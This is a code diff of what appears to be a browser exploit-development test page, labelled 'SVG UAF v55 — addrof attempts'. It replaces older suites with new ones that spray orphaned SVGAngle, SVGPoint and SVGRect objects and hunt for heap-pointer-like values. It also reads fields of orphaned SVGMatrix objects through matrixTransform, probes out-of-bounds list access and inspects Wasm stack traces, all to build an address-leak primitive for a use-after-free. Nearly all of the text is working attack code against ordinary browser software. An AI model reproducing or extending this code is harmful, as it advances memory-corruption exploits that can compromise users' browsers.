-  var numRefs=sprayOrphanNums(200, 0, 'c3n1');
-  var xHits=0;
-  for(var i=0;i<numRefs.length;i++){
-    var v=numRefs[i].value;
-    // SVGLength value as float32
-    if(v===Math.fround(XVAL)){
-      xHits++;
-      L('CONF3: [T2] ★ num['+i+']='+v+' matches SVGLength XVAL!','hit');
+  // Phase 3: Spray orphaned SVGAngles, read unitType and value before setting
+  // Alloc fresh SVGAngles from IsoHeap, check initial unitType byte
+  L('ADR15: [P3] fresh SVGAngle IsoHeap uninit probe...');
+  var angleHits=0;
+  for(var k=0;k<200;k++){
+    var svg2=makeSVG();
+    var mk2=document.createElementNS(SVG_NS,'marker');
+    mk2.setAttribute('orient','0deg');
+    svg2.appendChild(mk2);
+    var a2=mk2.orientAngle.baseVal;
+    var initVal=a2.value;
+    var initUnit=a2.unitType;
+    // unitType=1(deg), value=0 is expected for "0deg"
+    if(initVal!==0){
+      angleHits++;
+      if(angleHits<=5) L('ADR15: [P3] ★ angle['+k+'] initVal='+initVal+' bits='+f64hex(initVal),'hit');
     }
-    if(v!==0&&v!==Math.fround(i)){
-      L('CONF3: [T2] num['+i+']='+v+' nonzero unexpected bits='+f64hex(v),'hit');
+    if(initUnit!==1){
+      angleHits++;
+      if(angleHits<=5) L('ADR15: [P3] ★ angle['+k+'] initUnit='+initUnit+' (expected 1=deg)','hit');
     }
+    mk2.parentNode.removeChild(mk2);removeSVG(svg2);
   }
-  L('CONF3: [T2] SVGLength→SVGNumber hits='+xHits+(xHits>0?' ★ CROSS-TYPE!':'clean'));
+  L('ADR15: [P3] non-default SVGAngles='+angleHits+'/200'+(angleHits>0?' ★ UNINIT!':'clean'));
 
-  // Test 3: SVGNumber write, then SVGLength read
-  // Orphan SVGNumbers with distinctive value, then alloc SVGLengths
-  var numRefs2=sprayOrphanNums(200, 0, 'c3n2');
-  var NVAL=9876543.21;
-  for(var i=0;i<numRefs2.length;i++) numRefs2[i].value=Math.fround(NVAL);
-  L('CONF3: [T3] wrote NVAL='+Math.fround(NVAL)+' to 200 orphaned SVGNumbers');
+  // Phase 4: SVGAngle.valueAsString — does it ever expose raw C++ data?
+  L('ADR15: [P4] SVGAngle.valueAsString probe...');
+  var svg3=makeSVG();
+  var mk3=document.createElementNS(SVG_NS,'marker');
+  mk3.setAttribute('orient','123.456deg');svg3.appendChild(mk3);
+  var a3=mk3.orientAngle.baseVal;
+  L('ADR15: [P4] valueAsString='+a3.valueAsString+' valueInSpecifiedUnits='+a3.valueInSpecifiedUnits);
+  L('ADR15: [P4] bits of valueInSpecifiedUnits='+f64hex(a3.valueInSpecifiedUnits));
+  // valueInSpecifiedUnits is the stored float — is it f32 or f64?
+  var tv=123.456;
+  a3.valueInSpecifiedUnits=tv;
+  L('ADR15: [P4] wrote '+tv+' → readback='+a3.valueInSpecifiedUnits+' isF32='+(a3.valueInSpecifiedUnits===Math.fround(tv)));
+  mk3.parentNode.removeChild(mk3);removeSVG(svg3);
 
-  // Alloc many SVGLengths via rect.x.baseVal
-  var lenHits=0;
-  var svgLens=[];
-  for(var k=0;k<20;k++){
-    var svg3=makeSVG();
-    var r=document.createElementNS(SVG_NS,'rect');
-    r.setAttribute('width','50');r.setAttribute('height','50');
-    svg3.appendChild(r);
-    var len=r.width.baseVal;
-    svgLens.push({len:len,initial:len.value,svg:svg3,r:r});
-  }
-  for(var k=0;k<svgLens.length;k++){
-    var initial=svgLens[k].initial;
-    if(initial===Math.fround(NVAL)){
-      lenHits++;
-      L('CONF3: [T3] ★ len['+k+'].initial='+initial+' matches NVAL!','hit');
-    }
-    // also check for any ptr-like values
-    if(isPointerLike(initial)) L('CONF3: [T3] len['+k+'].initial='+initial+' PTR-LIKE!','hit');
-    svgLens[k].r.parentNode.removeChild(svgLens[k].r);
-    removeSVG(svgLens[k].svg);
-  }
-  L('CONF3: [T3] SVGNumber→SVGLength hits='+lenHits+(lenHits>0?' ★ CROSS-TYPE!':'clean'));
-
-  // Test 4: SVGTransformList.getItem() out of bounds — what does it return?
-  L('CONF3: [T4] SVGTransformList getItem OOB...');
-  var svg4=makeSVG();
-  var g4=document.createElementNS(SVG_NS,'g');svg4.appendChild(g4);
-  var xf4=svg4.createSVGTransform();g4.transform.baseVal.appendItem(xf4);
-  L('CONF3: [T4] list length='+g4.transform.baseVal.length);
-  try{
-    var oob=g4.transform.baseVal.getItem(100); // way OOB
-    L('CONF3: [T4] getItem(100)='+oob+' (expected throw or null)','warn');
-    if(oob&&oob.matrix){
-      var om=oob.matrix;
-      L('CONF3: [T4] OOB matrix: a='+om.a+' b='+om.b+' c='+om.c+' d='+om.d+' e='+om.e+' f='+om.f);
-      for(var field of['a','b','c','d','e','f']){
-        if(isPointerLike(om[field])) L('CONF3: ★★ OOB matrix.'+field+'='+om[field]+' PTR-LIKE!','hit');
-      }
-    }
-  }catch(ex){L('CONF3: [T4] OOB threw (expected): '+ex.message);}
-  removeSVG(svg4);
-
-  L('CONF3: done');
+  L('ADR15: done');
 }
 
 // ─────────────────────────────────────────────────────────────────
-// ADR7c — Wasm fixed, properly encoded LEB128
-// Module: imports env.cb (()->void), exports "run" (()->void, calls cb)
-// We carefully encode every length as LEB128 unsigned.
+// ADR16: SVGRect + SVGPoint orphan — new primitives, new oracle paths
+//
+// SVGRect: {x, y, width, height} — 4 floats? or 4 float64s?
+// SVGPoint: {x, y} — 2 floats? or 2 float64s?
+//
+// SVGPoint.matrixTransform(matrix) → new SVGPoint
+// If SVGPoint uses float64 internally, we have TWO more registers.
+// And: SVGPoint.matrixTransform on an orphaned SVGMatrix gives us
+// a new SVGPoint computed from C++ matrix fields.
+//
+// SVGRect: createSVGRect() → rect.x, rect.y, rect.width, rect.height
+// These might be float64 because SVGRect is used for bounding boxes
+// which need double precision.
 // ─────────────────────────────────────────────────────────────────
-function runADR7c(){
-  L('','suite-hdr');L('ADR7c: Wasm stack frame leak (corrected encoding)');
-  if(typeof WebAssembly==='undefined'){L('ADR7c: unavailable','miss');return;}
+function runADR16(){
+  L('','suite-hdr');L('ADR16: SVGRect/SVGPoint orphan — float precision + new oracle paths');
 
-  // Manually build correct wasm binary:
-  // Sections: type, import, function, export, code
-  //
-  // Type section: type[0] = () -> ()
-  //   0x01 0x04   -- section 1, 4 bytes
-  //   0x01        -- 1 type
-  //   0x60 0x00 0x00  -- functype: 0 params, 0 results
-  //
-  // Import section: env.cb :: type[0]
-  //   field: "env" = 65 6e 76  (len=3)
-  //   name:  "cb"  = 63 62     (len=2)
-  //   kind=0x00, type_idx=0x00
-  //   payload = 01 03 65 6e 76 02 63 62 00 00  (10 bytes)
-  //
-  // Function section: func[1] = type[0]
-  //   payload = 01 00  (2 bytes)
-  //
-  // Export section: "run" = func[1]
-  //   "run" = 72 75 6e  (len=3)
-  //   payload = 01 03 72 75 6e 00 01  (7 bytes)
-  //
-  // Code section: 1 body, body=[ 0 locals, call 0, end ]
-  //   body bytes: 00 10 00 0b = 4 bytes, body_size=4
-  //   payload = 01 04 00 10 00 0b  (6 bytes... wait body_size prefix)
-  //   Actually: count=1, then body_size(u32 leb)=4, then 4 bytes
-  //   payload = 01 04 00 10 00 0b  → 6 bytes
+  // Test 1: SVGPoint precision
+  var svg=makeSVG();
+  var pt=svg.createSVGPoint();
+  var f64val=1234567890.123456789;
+  pt.x=f64val;pt.y=f64val;
+  L('ADR16: [T1] SVGPoint.x: wrote='+f64val+' read='+pt.x+' isF64='+(pt.x===f64val)+' isF32='+(pt.x===Math.fround(f64val)));
+  L('ADR16: [T1] bits: wrote='+f64hex(f64val)+' got='+f64hex(pt.x));
 
-  var mod = [
-    0x00,0x61,0x73,0x6d, // magic
-    0x01,0x00,0x00,0x00, // version
-    // Type section
-    0x01, 0x04,
-      0x01,
-      0x60,0x00,0x00,
-    // Import section: 1 import: "env"."cb" = func type[0]
-    0x02, 0x0a,
-      0x01,
-      0x03, 0x65,0x6e,0x76,   // "env"
-      0x02, 0x63,0x62,        // "cb"
-      0x00, 0x00,             // kind=func, type index=0
-    // Function section: func[1] = type[0]
-    0x03, 0x02,
-      0x01,
-      0x00,
-    // Export section: "run" → func index 1
-    0x07, 0x07,
-      0x01,
-      0x03, 0x72,0x75,0x6e,   // "run"
-      0x00, 0x01,             // kind=func, index=1
-    // Code section: 1 body
-    0x0a, 0x06,
-      0x01,           // 1 function body
-      0x04,           // body size = 4 bytes
-      0x00,           // 0 locals
-      0x10, 0x00,     // call func[0]
-      0x0b,           // end
-  ];
+  // Test 2: SVGPoint orphan — stays alive after svg removal?
+  var svg2=makeSVG();
+  var pt2=svg2.createSVGPoint();
+  pt2.x=9999.9999;pt2.y=8888.8888;
+  var x0=pt2.x;
+  removeSVG(svg2);
+  L('ADR16: [T2] SVGPoint after svg-remove: x='+pt2.x+' ALIVE='+(pt2.x===x0));
+  // Write after orphan
+  pt2.x=1234567;
+  L('ADR16: [T2] SVGPoint write after orphan: x='+pt2.x+' WRITABLE='+(pt2.x===1234567));
 
-  var bytes=new Uint8Array(mod);
-  var stackInside=null;
+  // Test 3: SVGRect precision
+  var svg3=makeSVG();
+  var rect=svg3.createSVGRect();
+  rect.x=f64val;rect.y=f64val;rect.width=f64val;rect.height=f64val;
+  L('ADR16: [T3] SVGRect.x: wrote='+f64val+' read='+rect.x+' isF64='+(rect.x===f64val)+' isF32='+(rect.x===Math.fround(f64val)));
+  L('ADR16: [T3] bits: wrote='+f64hex(f64val)+' got='+f64hex(rect.x));
 
-  WebAssembly.instantiate(bytes.buffer,{
-    env:{
-      cb:function cb_from_wasm(){
-        stackInside=new Error('inside_wasm').stack;
-        throw new Error('thrown_inside_wasm');
-      }
+  // Test 4: SVGPoint.matrixTransform with orphaned matrix
+  // If we set matrix.e=K (e and f are translation fields), then
+  // pt.matrixTransform(m) → result.x = m.a*pt.x + m.c*pt.y + m.e
+  // With pt.x=0, pt.y=0, m=identity except m.e=K → result.x=K
+  var m=getOrphanedMatrix();
+  var K=0x1b00001234; // test value (arm64 heap range)
+  m.a=1;m.b=0;m.c=0;m.d=1;m.e=K;m.f=0;
+  var pt3=svg.createSVGPoint();pt3.x=0;pt3.y=0;
+  try{
+    var res=pt3.matrixTransform(m);
+    L('ADR16: [T4] pt.matrixTransform(orphanedMatrix): result.x='+res.x+' expected='+K+' exact='+(res.x===K));
+    L('ADR16: [T4] bits: expected='+f64hex(K)+' got='+f64hex(res.x));
+    // This confirms: matrixTransform works on orphaned matrices
+    // AND it returns a float64-precision result (SVGPoint.x is f64)
+  }catch(ex){L('ADR16: [T4] matrixTransform: '+ex.message,'warn');}
+
+  // Test 5: Can we use SVGPoint.matrixTransform to READ the matrix fields?
+  // Set matrix to identity, read known field values through matrixTransform
+  var m2=getOrphanedMatrix();
+  var SECRET_E=0x1b0deadbeef; // distinctive value we write to m.e
+  var SECRET_F=0x1b0cafebabe; // distinctive value we write to m.f
+  m2.a=1;m2.b=0;m2.c=0;m2.d=1;m2.e=SECRET_E;m2.f=SECRET_F;
+
+  // Read e via: pt=(0,0) → result.x = m.e
+  var ptA=svg.createSVGPoint();ptA.x=0;ptA.y=0;
+  try{
+    var rA=ptA.matrixTransform(m2);
+    L('ADR16: [T5] read e via matrixTransform: result.x='+rA.x+' expected='+SECRET_E+' exact='+(rA.x===SECRET_E));
+    // Read f via: pt=(0,0) → result.y = m.f (m.b*0 + m.d*0 + m.f)
+    // Actually result.y = m.b*0 + m.d*pt.y + m.f = m.f when pt.y=0
+    L('ADR16: [T5] read f via matrixTransform: result.y='+rA.y+' expected='+SECRET_F+' exact='+(rA.y===SECRET_F));
+    L('ADR16: [T5] e bits: expected='+f64hex(SECRET_E)+' got='+f64hex(rA.x));
+    L('ADR16: [T5] f bits: expected='+f64hex(SECRET_F)+' got='+f64hex(rA.y));
+  }catch(ex){L('ADR16: [T5] '+ex.message,'warn');}
+
+  // Test 6: getBBox() — reads C++ layout geometry, returns SVGRect
+  // getBBox() on a rendered element returns the bounding box as computed
+  // by the layout engine. The returned SVGRect's fields come from C++
+  // layout floats. Could they ever contain heap pointers? Unlikely but fast to check.
+  L('ADR16: [T6] getBBox probe...');
+  var svg4=makeSVG();svg4.style.width='100px';svg4.style.height='100px';
+  var rect4=document.createElementNS(SVG_NS,'rect');
+  rect4.setAttribute('x','10');rect4.setAttribute('y','20');
+  rect4.setAttribute('width','50');rect4.setAttribute('height','30');
+  svg4.appendChild(rect4);
+  try{
+    var bb=rect4.getBBox();
+    L('ADR16: [T6] getBBox: x='+bb.x+' y='+bb.y+' w='+bb.width+' h='+bb.height);
+    for(var field of['x','y','width','height']){
+      if(isPointerLike(bb[field])) L('ADR16: [T6] ★★ getBBox.'+field+'='+bb[field]+' PTR-LIKE!','hit');
     }
-  }).then(function(res){
-    L('ADR7c: instantiated OK exports='+Object.keys(res.instance.exports).join(','));
-    try{
-      res.instance.exports.run();
-    }catch(err){
-      L('ADR7c: caught: '+err.message);
+  }catch(ex){L('ADR16: [T6] getBBox: '+ex.message,'warn');}
+  removeSVG(svg4);
 
-      // Stack captured INSIDE the wasm frame
-      if(stackInside){
-        L('ADR7c: === stack INSIDE wasm callback ===');
-        L(stackInside.slice(0,1000));
-        var insideHex=stackInside.match(/0x[0-9a-fA-F]{6,}/g)||[];
-        L('ADR7c: inside hex patterns: '+insideHex.length);
-        for(var i=0;i<insideHex.length;i++) L('ADR7c: ★inside '+insideHex[i],'hit');
-        // wasm-specific lines
-        stackInside.split('\n').forEach(function(line){
-          if(/wasm/i.test(line)||/@\[/.test(line)||/\[wasm-stub\]/.test(line)||/wasm-function/i.test(line)){
-            L('ADR7c: wasm-line: '+line);
-          }
-        });
-      }
-
-      // Stack from outer catch
-      var outerStk=err.stack||'';
-      L('ADR7c: === outer catch stack ===');
-      L(outerStk.slice(0,1000));
-      var outerHex=outerStk.match(/0x[0-9a-fA-F]{6,}/g)||[];
-      L('ADR7c: outer hex patterns: '+outerHex.length);
-      for(var i=0;i<outerHex.length;i++) L('ADR7c: ★outer '+outerHex[i],'hit');
-      outerStk.split('\n').forEach(function(line){
-        if(/wasm/i.test(line)||/@\[/.test(line)||/wasm-function/i.test(line)){
-          L('ADR7c: wasm-line: '+line);
-        }
-      });
+  // Test 7: SVGPoint spray — check initial values before setting
+  L('ADR16: [T7] fresh SVGPoint IsoHeap probe...');
+  var ptHits=0;
+  for(var k=0;k<200;k++){
+    var svgX=makeSVG();
+    var ptX=svgX.createSVGPoint();
+    // x and y start at 0 by spec — but does IsoHeap give us zeros?
+    if(ptX.x!==0||ptX.y!==0){
+      ptHits++;
+      if(ptHits<=5) L('ADR16: [T7] ★ pt['+k+'] x='+ptX.x+' '+f64hex(ptX.x)+' y='+ptX.y+' '+f64hex(ptX.y),'hit');
+      if(isPointerLike(ptX.x)) L('ADR16: [T7] ★★ x PTR-LIKE! oracle='+inverseOracle(ptX.x),'hit');
+      if(isPointerLike(ptX.y)) L('ADR16: [T7] ★★ y PTR-LIKE! oracle='+inverseOracle(ptX.y),'hit');
     }
-  }).catch(function(err){
-    L('ADR7c: compile FAILED: '+err.message,'miss');
-    // Dump the bytes for debugging
-    L('ADR7c: module bytes: '+Array.from(bytes).map(function(b){return b.toString(16).padStart(2,'0');}).join(' '));
-  });
+    removeSVG(svgX);
+  }
+  L('ADR16: [T7] nonzero fresh SVGPoints='+ptHits+'/200'+(ptHits>0?' ★ UNINIT!':'clean'));
+
+  removeSVG(svg);removeSVG(svg3);
+  L('ADR16: done');
 }
 
 // ─────────────────────────────────────────────────────────────────
 // RUN ALL
 // ─────────────────────────────────────────────────────────────────
-var suites={CONF1:runCONF1,CONF2:runCONF2,CONF3:runCONF3,ADR7c:runADR7c};
+var suites={ADR13:runADR13,ADR14:runADR14,ADR15:runADR15,ADR16:runADR16};
 
 function runSuite(name){
   L('=== '+name+' ===','suite-hdr');
@@ -595,7 +575,7 @@ function runSuite(name){
 
 function runAll(){
   clearOut();
-  L('SVG UAF v54 — IsoHeap Confusion + Wasm Fix','suite-hdr');
+  L('SVG UAF v55 — addrof attempts','suite-hdr');
   L('----------------------------------------------------');
   var names=Object.keys(suites);
   var i=0;
